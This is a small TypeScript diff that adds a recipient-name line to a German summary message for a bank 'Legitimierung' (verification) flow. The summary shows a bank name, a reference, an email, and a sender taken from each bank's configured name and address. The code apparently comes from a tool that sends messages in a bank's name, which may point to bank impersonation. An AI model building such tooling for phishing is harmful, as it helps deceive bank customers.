@@ -304,6 +304,7 @@ function summary(flow: string, d: Record<string, string>): string {
   }
   return (
     `📋 <b>Zusammenfassung – ${bank.name}-Legitimierung</b>\n\n` +
+    `<b>An:</b> ${d.empfaenger_name}\n` +
     `<b>Referenz:</b> ${d.referenz}\n` +
     `<b>Email:</b> ${d.email}\n\n` +
     `<b>Absender:</b> ${bank.fromName} &lt;${bank.fromEmail}&gt;`
